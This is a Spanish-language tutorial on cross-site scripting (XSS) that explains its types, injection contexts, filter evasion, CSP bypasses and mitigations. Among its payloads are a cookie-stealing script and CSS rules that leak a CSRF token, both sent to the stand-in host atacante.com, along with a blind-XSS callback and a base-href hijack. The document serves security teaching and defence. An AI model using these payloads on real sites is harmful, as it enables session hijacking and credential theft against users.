# ¿Qué es XSS (Cross-Site Scripting)?

El Cross-Site Scripting (XSS) es una vulnerabilidad de seguridad que permite a un atacante inyectar scripts maliciosos (comúnmente JavaScript) en páginas web vistas por otros usuarios. Estos scripts se ejecutan en el navegador de la víctima en el contexto del sitio web vulnerable.

A diferencia de otros ataques que se dirigen al servidor, XSS se enfoca en los usuarios de la aplicación.

**Impacto del XSS:**

El XSS no es solo un `alert()`. El impacto puede ser severo, incluyendo:

- **Robo de Sesión (Cookie Stealing):** Acceder a las cookies de sesión de la víctima para suplantar su identidad.
- **Keylogging:** Capturar las pulsaciones de teclado de la víctima (credenciales, información personal).
- **Phishing:** Modificar la página para mostrar formularios de login falsos y robar credenciales.
- **Defacement:** Modificar la apariencia del sitio web.
- **Redirección a Sitios Maliciosos:** Enviar a la víctima a sitios que descarguen malware o realicen otros ataques.
- **Ejecución de Acciones en Nombre del Usuario:** Realizar acciones como si fuera el usuario (publicar, borrar, comprar).
- **Bypass de CSRF:** Los scripts pueden generar peticiones con tokens CSRF si están disponibles en el DOM.
- **Escaneo de Red Interna:** Usar el navegador de la víctima como proxy para escanear puertos de su red local.

### Ejemplo Básico de XSS Reflejado

Consideremos un código HTML y PHP simple:

**HTML Vulnerable (`index.html`):**

```html
<html>
  <body>
    <form method="GET" action="saludo.php">
      <p>What's your name?</p>
      <input name="name" type="text">
      <button type="submit">Submit</button>
    </form>
  </body>
</html>
```

**PHP Vulnerable (`saludo.php`):**

```php
<?php
  if (isset($_GET['name'])) {
    // Vulnerabilidad: Se imprime el parámetro 'name' directamente sin sanitizar/codificar.
    echo "Hola, " . $_GET['name'] . "!";
  }
?>
```

**Explotación:**

Un atacante puede construir una URL como: `https://sitio-vulnerable.com/saludo.php?name=<script>alert("XSS POC")</script>`

Cuando una víctima visita esta URL, el script se inyecta en la respuesta HTML y el navegador lo ejecuta: `Hola, <script>alert("XSS POC")</script>!`

**Explotación con Impacto Real (Robo de Cookies):**

Payload: `<script>var img = new Image(); img.src = "http://atacante.com/steal?cookie=" + document.cookie;</script>` URL maliciosa: `https://sitio-vulnerable.com/saludo.php?name=<script>var i=new Image();i.src="http://atacante.com/c=" %2B document.cookie;</script>` _(Nota: `%2B` es `+` codificado en URL)_

Cuando la víctima visita la URL, su navegador ejecuta el script, que envía sus cookies (si no son `HttpOnly`) al servidor del atacante.

### Tipos Principales de XSS

1. **XSS Reflejado (Reflected XSS):**

   - El payload malicioso se envía como parte de la petición HTTP (normalmente en un parámetro GET de la URL, pero también puede ser en POST).
   - El servidor "refleja" el payload en la respuesta HTTP sin la sanitización o codificación adecuada.
   - Requiere que la víctima haga clic en un enlace malicioso o envíe un formulario preparado por el atacante.
   - **Superficies de ataque comunes:** Parámetros URL, datos de formularios POST.
   - **Metodología de testeo:**
     - Identificar todos los puntos de entrada de usuario (parámetros GET/POST, cabeceras HTTP reflejadas).
     - Enviar texto de prueba (e.g., `TESTXSS`) y buscar dónde se refleja en la respuesta (usar "Ver código fuente" o las herramientas de desarrollador del navegador).
     - Probar con etiquetas HTML inocuas para ver si se renderizan (e.g., `<u>test</u>`, `<b>test</b>`).
     - Si se renderizan, intentar inyectar scripts.
2. **XSS Almacenado (Stored XSS / Persistent XSS):**

   - El payload malicioso se almacena permanentemente en el servidor de la aplicación (e.g., en una base de datos, archivo de log, foro de mensajes, comentarios, perfil de usuario).
   - Cuando cualquier usuario visita la página que muestra estos datos almacenados, el script se ejecuta en su navegador.
   - **Impacto mayor:** No requiere una acción específica de la víctima (como hacer clic en un enlace) más allá de visitar la página afectada. Puede afectar a todos los usuarios que vean el contenido malicioso, e incluso puede usarse para crear gusanos XSS (XSS worms).
   - **Superficies de ataque comunes:** Campos de perfil de usuario, comentarios, posts en foros, nombres de archivo subidos, carritos de compra, logs visibles por administradores.
3. **XSS Basado en DOM (DOM-based XSS):**

   - La vulnerabilidad reside enteramente en el código JavaScript del lado del cliente.
   - Ocurre cuando JavaScript toma datos de una fuente controlable por el atacante (e.g., `location.hash`, `location.search`, `document.referrer`, `window.name`, `localStorage`, `sessionStorage`, datos de `postMessage`) y los pasa a un "sink" (una función o propiedad del DOM que puede ejecutar scripts o modificar el HTML de forma insegura) sin la validación o codificación adecuadas.
   - El payload puede no llegar nunca al servidor, lo que lo hace difícil de detectar por WAFs o logs del servidor.
   - **Ejemplo:**

     JavaScript

```javascript
  // Código vulnerable en la página
  var searchTerm = location.hash.substring(1); // Fuente: location.hash
  document.getElementById('searchResults').innerHTML = "Resultados para: " + searchTerm; // Sink: innerHTML
```

Payload del atacante: `https://sitio-vulnerable.com/busqueda#<img src=x onerror=alert(1)>`
- **Fuentes comunes (Sources):** `document.URL`, `document.documentURI`, `location.href`, `location.search`, `location.hash`, `document.referrer`, `window.name`, `localStorage.getItem()`, `sessionStorage.getItem()`, datos recibidos vía `postMessage`.
- **Sinks peligrosos (Sinks):** `element.innerHTML`, `element.outerHTML`, `document.write()`, `document.writeln()`, `eval()`, `setTimeout()`, `setInterval()`, `element.setAttribute('href', 'javascript:...')`, `script.src`, jQuery's `$(...).html()`, `$(...).append()`, `window.location.assign()`, `$.parseHTML()`.
4. **Blind XSS:**

- Es una variante de XSS Almacenado donde el atacante inyecta un payload, pero la reflexión (ejecución del script) ocurre en una parte diferente de la aplicación que el atacante no ve directamente (e.g., un panel de administración interno, un visor de logs, una aplicación móvil que consume datos de una API).
- El atacante inyecta el payload "a ciegas" y espera una notificación (callback) cuando se ejecute.
- **Herramientas (Servidores de Callback):**
    - **Interactsh (de ProjectDiscovery):** Genera URLs únicas para usar en payloads. Cuando el payload se ejecuta, hace una petición a esta URL, notificando al atacante.
    - **Burp Collaborator Client (Burp Suite Pro):** Similar a Interactsh.
    - **XSS Hunter Express (auto-hosteable):** Alternativa a XSSHunter.com (ya no activo).
- **Pasos:**
    1. Generar un payload con un servidor de callback (e.g., `<script src="https://tu-dominio-interactsh.com"></script>`).
    2. Inyectar el payload en todos los campos de entrada posibles, incluyendo cabeceras HTTP (User-Agent, Referer, X-Forwarded-For), formularios de contacto, feedback, etc.
    3. Esperar la notificación (pingback) en el servidor de callback, que indicará la URL donde se ejecutó, IP de la víctima, cookies (si es posible), etc.
### Contextos de Inyección y Técnicas de Escape

El payload XSS debe adaptarse al contexto específico donde se inyecta el input del usuario.

1. **Inyección Directa en HTML:**

   - Entre etiquetas: `<div>AQUÍ_INPUT</div>` -> Payload: `<script>alert(1)</script>`
   - `URL_param=javascript:alert(1)` (en `href` de `<a>` o `src` de `<iframe>`)
   - `URL_param=<a href="javascript:alert(1)">Click</a>`
   - `URL_param=<iframe src="javascript:alert(1)"></iframe>`
   - `URL_param=<iframe srcdoc="<script>alert(1)</script>"></iframe>` (si `srcdoc` está permitido)
2. **Inyección Dentro de Atributos HTML:**

   - Input: `<input type="text" value="AQUÍ_INPUT">`
     - Escape: `"><script>alert(1)</script>` (cierra el atributo y la etiqueta)
     - Con Event Handler: `" onmouseover="alert(1);"` (cierra el valor, añade un event handler)
     - Si las comillas están filtradas: `value=USUARIO onmouseover=alert(1)//` (el `//` comenta el resto)
   - Input: `<a href="/ruta/AQUÍ_INPUT">`
     - Escape: `javascript:alert(1)` (si el servidor lo permite en `href`)
3. **Inyección Dentro de Etiquetas HTML Específicas (Escapando de ellas):**

   - `</textarea><script>alert(1)</script>`
   - `</title><script>alert(1)</script>`
   - `</style><script>alert(1)</script>`
   - `</script><script>alert(1)</script>` (si el input va dentro de otro script)
   - `<script>alert(1)</script>` (escapando de comentarios HTML)
4. **Inyección Dentro de JavaScript (JS Injection):**

   - El input se refleja dentro de una etiqueta `<script> ... </script>`.
   - Contexto: String literal.

     JavaScript

```javascript
 <script>
  var username = 'AQUÍ_INPUT';
document.getElementById('greeting').innerText = 'Hola, ' + username;
  </script>
```
Payload: `';alert(document.domain);var ignore='` Resultado: `var username = '';alert(document.domain);var ignore='';` (el payload cierra el string, ejecuta código, y crea una nueva variable para que el resto del script original no cause error).
- Contexto: Asignación numérica.

```javascript
<script>
  var userId = AQUÍ_INPUT;
</script>
```
Payload: `1; alert(1)`
- Contexto: Dentro de una función o método.

```javascript
   <script>
   customFunction('AQUÍ_INPUT');      </script>
```
Payload: `');alert(1);customFunction('`
5. **Inyección en CSS (menos común para ejecución de JS directa hoy en día):**

- Escapar del contexto CSS a HTML: `input_controlado}</style><script>alert(1)</script>`
- Funcionalidad `url()`: `body { background-image: url("javascript:alert(1)"); }` (obsoleto en navegadores modernos).
- `expression()`: `div { width: expression(alert(1)); }` (solo IE, muy obsoleto).
- **CSS Injection para robo de datos (avanzado):** Usar selectores de atributos para inferir caracteres y enviarlos a un servidor externo.
```css
input[name="csrf_token"][value^="a"] { background-image: url("http://atacante.com/log?char=a"); }
input[name="csrf_token"][value^="b"] { background-image: url("http://atacante.com/log?char=b"); }
/* ... y así sucesivamente para cada caracter ... */
```
### XSS en Diferentes Content-Types y Contextos Especiales

- **Content-Type Incorrecto:**
  - Si una API devuelve datos JSON (e.g., `{"mensaje":"Hola ben"}`) pero con la cabecera `Content-Type: text/html` en lugar de `application/json`, el navegador puede interpretar la respuesta como HTML.
  - Si el contenido JSON es controlable por el atacante, podría inyectar HTML/JS.
  - Mitigación del servidor: `X-Content-Type-Options: nosniff`.
- **Markdown XSS:**
  - Si un sitio permite Markdown y el parser/sanitizador no es seguro.
  - `[un enlace](javascript:alert(1))`
  - `![una imagen](x"onerror="alert(1))"` (se convierte en `<img src="x" onerror="alert(1)" alt="una imagen">`)
- **SVG XSS:**
  - Los archivos SVG son XML y pueden contener scripts. Si se permite subir SVGs y se muestran inline.
  - `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>`
- **XSS en Atributos `style`:**
  - `<div style="width: expression(alert(1))"></div>` (IE)
  - `<div style="background:url(javascript:alert(1))"></div>` (navegadores antiguos)

### Técnicas de Evasión de Filtros (Bypasses)

Los filtros XSS (WAFs, sanitizadores del lado del servidor o cliente) intentan bloquear payloads conocidos. Los atacantes usan técnicas de evasión:

- **Case Insensitivity:** `<ScRiPt>alert(1)</sCrIpT>`
- **Mezcla de Mayúsculas/Minúsculas en Event Handlers:** `<img src=x oNerroR=alert(1)>`
- **Tags Incompletos o Rotos (Tag Breaking):** `<sc<script>ript>alert(1)</sc</script>ript>`
- **Caracteres Nulos (Null Bytes):** `<img%00src=x onerror=alert(1)>` (si el backend los maneja mal).
- **Codificación (Encoding):**
  - URL Encoding: `%3Cscript%3Ealert(1)%3C/script%3E`
  - HTML Entities (decimal/hex): `&lt;script&gt;alert(1)&lt;/script&gt;`, `&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`
  - Doble Codificación: `&amp;lt;script&amp;gt;` -> `&lt;script&gt;` (si hay múltiples decodificaciones).
- **Uso de Caracteres Alternativos o Comentarios:**
  - Espacios/Tabs/Saltos de línea: `<img src = x onerror = alert(1)>`
  - Barra `/` en lugar de espacio: `<img/src=x/onerror=alert(1)>`
  - Comentarios HTML/XML: `<img src="x"onerror=alert(1)>`
  - Comentarios JavaScript: `<img src=x onerror="/*EVIL*/alert(1)//">`
- **Event Handlers Alternativos:** En lugar de `onerror`, usar `onmouseover`, `onclick`, `onfocus`, `onload`, `oncopy`, `oncut`, `onpaste`, etc.
  - `<svg onload=alert(1)>`
  - `<body onload=alert(1)>` (si puedes inyectar la etiqueta body)
  - `<div onpointerover="alert(1)">Pasa el ratón</div>`
- **Tags HTML Alternativos para Ejecutar JS:**
  - `<img src=x onerror=alert(1)>`
  - `<svg onload=alert(1)></svg>`
  - `<iframe src="javascript:alert(1)"></iframe>`
  - `<body onload=alert(1)>`
  - `<video><source onerror="javascript:alert(1)">`
  - `<audio src=x onerror=alert(1)>`
  - `<details open ontoggle=alert(1)>`
  - `<marquee onstart="alert(1)">`
- **JavaScript Obfuscation:**
  - `eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))` (payload `alert(document.domain)` codificado en Base64).
  - `String.fromCharCode(97,108,101,114,116,40,49,41)` (para `alert(1)`).
  - Uso de template literals: ``javascript:alert`1```
- **Mutación XSS (mXSS):** El navegador "corrige" HTML malformado de una manera que crea una vulnerabilidad XSS que no era obvia en el HTML original. Ocurre por diferencias en cómo el parser del navegador y el sanitizador/WAF interpretan el HTML.

### Content Security Policy (CSP) y sus Bypasses

**Content Security Policy (CSP)** es una cabecera HTTP (`Content-Security-Policy: ...`) que permite a los administradores de sitios web controlar los recursos que el navegador está autorizado a cargar para una página dada. Ayuda a prevenir y mitigar XSS.

**Ejemplo de Política CSP:** `default-src 'self'; script-src 'self' https://apis.google.com; object-src 'none'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;`

**Directivas Comunes:**

- `default-src`: Política por defecto para la mayoría de las directivas.
- `script-src`: Define fuentes válidas para JavaScript.
- `style-src`: Define fuentes válidas para CSS.
- `img-src`: Define fuentes válidas para imágenes.
- `connect-src`: Define a qué orígenes se puede conectar (XHR, WebSockets, EventSource).
- `frame-src`: Define orígenes válidos para iframes.
- `object-src`: Define orígenes válidos para `<object>`, `<embed>`, `<applet>`. (Peligroso si permite `*` o `data:`).
- `base-uri`: Restringe las URLs que pueden usarse en el elemento `<base>`.
- `'self'`: Permite cargar recursos del mismo origen.
- `'unsafe-inline'`: Permite JavaScript inline (event handlers, `<script>...</script>`) y CSS inline.
- `'unsafe-eval'`: Permite `eval()` y funciones similares.
- `nonce-{random}`: Permite scripts inline o estilos que tengan el atributo `nonce` con el valor aleatorio correcto.
- `hash-{algo}-{base64}`: Permite scripts inline o estilos cuyo hash coincida.

**Técnicas Comunes de Bypass de CSP (si la política es laxa):**

1. **`'unsafe-inline'` en `script-src`:** Permite XSS tradicional inline.
2. **`'unsafe-eval'` en `script-src`:** Permite el uso de `eval()`, `setTimeout("string")`, `JSON.parse()` sobre datos controlados, etc.
3. **Wildcards (`*`) o Dominios Demasiado Permisivos en `script-src`:**
   - Si `script-src *;` está presente, se puede cargar JS desde cualquier dominio.
   - Si `script-src https://*.cdn-seguro.com;` y el CDN permite alojar contenido de usuario o tiene un subdominio vulnerable.
   - Si `script-src https://algun-dominio-permitido.com;` y ese dominio tiene una vulnerabilidad de JSONP o contenido subido por usuarios que se pueda incluir como JS.
     - **JSONP Endpoints:** `https://dominio-permitido.com/api/jsonp?callback=alert(document.domain)//` -> `<script src="https://dominio-permitido.com/api/jsonp?callback=alert(document.domain)//"></script>`
4. **`data:` URI en `script-src`:**
   - Si `script-src data:;`, se pueden usar payloads como: `<script src="data:text/javascript,alert(1)"></script>`
5. **Subida de Archivos a Dominios Permitidos:**
   - Si `script-src 'self';` o `script-src https://misitio.com;` y se puede subir un archivo `.js` (o un archivo con extensión de imagen pero contenido JS si el `Content-Type` es correcto o se puede manipular) al mismo dominio.
   - Payload: `<script src="/uploads/payload.js"></script>`
6. **Falta de `object-src` o `default-src` (o si son muy permisivos):**
   - Se puede intentar inyectar `<object data="data:text/html,<script>alert(1)</script>">` o `<embed src="data:text/html,<script>alert(1)</script>">`.
7. **Falta de `base-uri`:**
   - Si no está definida o es laxa, se puede inyectar `<base href="https://atacante.com/">`. Las URLs relativas en la página (incluyendo scripts) ahora se cargarán desde el dominio del atacante (siempre que `script-src` lo permita).
8. **Endpoints que Reflejan JS (AngularJS, etc.):**
   - Algunas librerías JS (como versiones antiguas de AngularJS) pueden ejecutar JS desde el DOM en contextos específicos, incluso con CSPs restrictivas, si `unsafe-eval` no está presente pero se permite `self`.
9. **Service Workers:**
   - Si se puede registrar un Service Worker desde un dominio permitido en `script-src`, este puede interceptar peticiones y ejecutar código.
10. **Errores de Configuración de Nonce/Hash:**
    - Si el `nonce` es predecible, reutilizado o se filtra en la página.
    - Si se puede inyectar un script existente en la página que tenga un hash permitido (raro).

### Mitigaciones Generales contra XSS

- **Codificación de Salida Contextual (Contextual Output Encoding):** La principal defensa. Codificar los datos de forma diferente según el contexto donde se van a insertar:
  - Codificación HTML para datos entre etiquetas HTML.
  - Codificación de Atributos HTML para datos dentro de atributos.
  - Codificación JavaScript Unicode para datos dentro de contextos JavaScript.
  - Codificación CSS Hex para datos dentro de contextos CSS.
  - Codificación URL para datos en parámetros URL.
- **Validación de Entradas:** Rechazar entradas que no cumplan con el formato esperado. Es una defensa secundaria, no la principal.
- **Sanitización de HTML:** Si se debe permitir HTML del usuario, usar una librería robusta y bien probada para sanitizarlo (eliminar elementos y atributos peligrosos).
- **Content Security Policy (CSP):** Como se discutió, una capa de defensa crucial.
- **Cabecera `HttpOnly` en Cookies:** Impide que JavaScript acceda a las cookies, mitigando el robo de sesión directo, pero no otros impactos de XSS.
- **Cabecera `X-Content-Type-Options: nosniff`:** Evita que el navegador intente "adivinar" el `Content-Type` si el servidor lo envía incorrectamente.
- **Uso de Frameworks Seguros:** Muchos frameworks modernos (React, Angular, Vue) tienen protecciones XSS incorporadas (auto-codificación) si se usan correctamente.
